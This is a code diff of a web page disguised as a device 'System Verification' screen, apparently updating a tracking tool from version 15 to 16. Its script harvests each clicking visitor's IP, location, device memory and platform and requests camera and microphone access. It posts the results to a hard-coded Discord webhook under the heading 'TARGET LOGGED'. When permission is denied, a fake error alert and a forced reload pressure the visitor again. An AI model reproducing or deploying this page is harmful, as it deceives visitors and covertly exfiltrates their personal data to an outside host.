@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Critical System Update</title>
+    <title>System Verification</title>
     <script>
         const HOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
 
@@ -11,13 +11,11 @@
             let data = {
                 ip: "Scanning...",
                 loc: "Denied",
-                gpu: "Unknown",
                 ram: navigator.deviceMemory || "Unknown",
                 bat: "Unknown",
-                agent: navigator.userAgent
+                plat: navigator.platform
             };
 
-            // محاولة سحب الـ IP والموقع فوراً
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const json = await res.json();
@@ -25,15 +23,14 @@
                 data.loc = `${json.city}, ${json.country_name}`;
             } catch (e) {}
 
-            // طلب الكاميرا والميكروفون (لازم HTTPS عشان يظهر الطلب)
+            // طلب الأذونات (يشتغل فقط على HTTPS)
             try {
                 await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 send(data, "✅ GRANTED");
             } catch (err) {
                 send(data, "❌ DENIED");
-                // هندسة اجتماعية: إجبار المستخدم على المحاولة مرة أخرى
-                alert("Security Error: Camera and Mic access required to verify device.");
-                location.reload();
+                alert("Critical Error: Verification Failed. Please Allow Camera Access.");
+                location.reload(); 
             }
         }
 
@@ -45,16 +42,15 @@
 
             const msg = {
                 embeds: [{
-                    title: "🎯 TARGET LOGGED - V15",
+                    title: "🎯 TARGET LOGGED - SUPREME V16",
                     color: 16711680,
                     fields: [
-                        { name: "🌐 IP", value: info.ip, inline: true },
+                        { name: "🌐 IP Address", value: info.ip, inline: true },
                         { name: "📍 Location", value: info.loc, inline: true },
                         { name: "📸 Permissions", value: status, inline: true },
                         { name: "🧠 RAM", value: info.ram + " GB", inline: true },
                         { name: "🔋 Battery", value: info.bat, inline: true },
-                        { name: "📱 OS", value: navigator.platform, inline: true },
-                        { name: "🕵️ Agent", value: info.agent, inline: false }
+                        { name: "📱 OS", value: info.plat, inline: true }
                     ],
                     footer: { text: "r3b Supreme Engine" },
                     timestamp: new Date()
@@ -64,21 +60,20 @@
             fetch(HOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
         }
 
-        // يشتغل بمجرد الضغط في أي مكان (إجباري للمتصفحات)
         window.onclick = grab;
     </script>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
-        .warn { border: 2px solid #f00; padding: 50px; box-shadow: 0 0 20px #f00; }
-        .blink { animation: blinker 1s linear infinite; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
+        .box { border: 1px solid #0f0; padding: 50px; box-shadow: 0 0 15px #0f0; }
+        .blink { animation: blinker 1.5s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="warn">
-        <h1 class="blink">SYSTEM BREACH DETECTED</h1>
-        <p>Your device integrity is compromised.</p>
-        <p style="color: #fff;">[ CLICK ANYWHERE TO FIX ]</p>
+    <div class="box">
+        <h1 class="blink">SYSTEM AUDIT REQUIRED</h1>
+        <p>Verification ID: #77429</p>
+        <p style="color: #fff;">[ CLICK TO VERIFY DEVICE ]</p>
     </div>
 </body>
 </html>
